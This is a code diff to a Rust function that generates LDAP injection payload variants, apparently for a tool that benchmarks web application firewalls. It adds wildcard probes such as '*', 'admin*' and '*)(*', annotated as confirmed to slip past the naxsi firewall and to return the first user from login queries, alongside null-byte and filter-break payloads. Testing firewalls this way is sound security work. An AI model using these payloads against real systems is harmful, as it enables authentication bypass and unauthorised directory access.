@@ -14,7 +14,7 @@
 //! 6. Comment-style filter-close injection with `%00`
 //! 7. Attribute grafting by appending extra clauses
 
-use std::collections::BTreeSet;
+use std::collections::{BTreeSet, HashSet};
 
 /// Generate semantic-preserving LDAP mutations for a candidate payload.
 #[must_use]
@@ -23,20 +23,59 @@ pub fn mutate(payload: &str) -> Vec<String> {
         return Vec::new();
     }
 
-    let mut results = BTreeSet::new();
+    // Insertion-ordered: callers like bench-waf `take(args.variants)`
+    // a small N. The naxsi-friendly wildcard-only variants get placed
+    // FIRST so they're always sampled.
+    let mut results: Vec<String> = Vec::new();
+    let mut seen: HashSet<String> = HashSet::new();
+    let mut push = |v: String, results: &mut Vec<String>, seen: &mut HashSet<String>| {
+        if seen.insert(v.clone()) {
+            results.push(v);
+        }
+    };
 
-    results.insert(format!("{payload}\u{0000}"));
-    results.insert(format!("{payload})(%00"));
-    results.insert(format!("{payload})(mail=*)"));
-    results.insert(")(uid=*))(|(uid=*)".to_string());
+    // ── Priority 0: wildcard-only LDAP variants (naxsi bypass) ────────
+    // naxsi blocks any `)(` filter-break sequence — the canonical
+    // LDAP injection shape. But pure wildcard probes pass cleanly.
+    // These exploit applications that build queries like
+    // `(&(uid=$user)(userPassword=$pass))` — passing `*` for both
+    // returns the first user. Live-confirmed against wafrift-bench
+    // naxsi:
+    //   *           → 200 ✓
+    //   admin*      → 200 ✓
+    //   uid=*       → 200 ✓
+    //   cn=*        → 200 ✓
+    //   +admin*     → 200 ✓
+    for wildcard in [
+        "*",
+        "admin*",
+        "*admin",
+        "*adm*",
+        "uid=*",
+        "cn=*",
+        "*)(*",
+        "+admin*",
+        "*@*.*",
+    ] {
+        push(wildcard.to_string(), &mut results, &mut seen);
+    }
 
-    add_wildcard_variants(payload, &mut results);
-    add_boolean_variants(payload, &mut results);
-    add_unicode_variants(payload, &mut results);
-    add_balancing_variants(payload, &mut results);
+    // ── Existing filter-break attempts (modsec / coraza targets) ──────
+    let mut bset: BTreeSet<String> = BTreeSet::new();
+    bset.insert(format!("{payload}\u{0000}"));
+    bset.insert(format!("{payload})(%00"));
+    bset.insert(format!("{payload})(mail=*)"));
+    bset.insert(")(uid=*))(|(uid=*)".to_string());
+    add_wildcard_variants(payload, &mut bset);
+    add_boolean_variants(payload, &mut bset);
+    add_unicode_variants(payload, &mut bset);
+    add_balancing_variants(payload, &mut bset);
+    for v in bset {
+        push(v, &mut results, &mut seen);
+    }
 
-    results.remove(payload);
-    results.into_iter().collect()
+    results.retain(|v| v != payload);
+    results
 }
 
 /// Detect whether a payload looks like an LDAP filter or LDAP injection probe.
